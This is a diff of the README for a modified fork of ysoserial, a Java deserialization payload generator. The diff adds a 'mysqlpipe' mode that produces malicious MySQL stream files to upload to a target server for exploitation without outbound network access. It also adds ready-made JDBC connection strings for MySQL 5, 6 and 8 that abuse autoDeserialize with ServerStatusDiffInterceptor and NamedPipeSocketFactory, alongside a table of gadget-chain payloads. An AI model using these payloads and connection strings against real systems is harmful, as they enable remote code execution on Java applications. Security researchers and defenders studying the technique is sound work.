@@ -5,12 +5,15 @@ ysoserial修改版，着重修改`ysoserial.payloads.util.Gadgets.createTemplate
 ## Usage
 
 ```shell
-$  java -jar ysoserial-0.0.6-SNAPSHOT-all.jar
-Y SO SERIAL?
-Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
+java -jar ysoserial_mysqlpipe-0.0.6-SNAPSHOT-all.jar
+Y SO SERIAL_mysqlpipe ?
+Usage: java -jar ysoserial_mysqlpipe-[version]-all.jar [mode] [payload] '[command]'
+[mode]: [gadget]/[mysqlpipe]_[version]_(user)
+提供mysql的pipe恶意流文件，上传服务器，进行不出网利用,数据库为test,用户名默认mysql,可自己设置。
+mysql5: jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&namedPipePath=output.pcap
+msysql6: jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath=output.pcap
+mysql8: jdbc:mysql://xxx/test?&maxAllowedPacket=74996390&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath=output.pcap
   Available payload types:
-一月 11, 2024 10:44:47 上午 org.reflections.Reflections scan
-信息: Reflections took 96 ms to scan 1 urls, producing 22 keys and 208 values
      Payload                                Authors                                Dependencies
      -------                                -------                                ------------
      AspectJWeaver                          @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
@@ -58,7 +61,7 @@ Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
      URLDNS                                 @gebl
      Vaadin1                                @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
      Wicket1                                @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
-```
+ ```
 
 ## 内存马相关
 
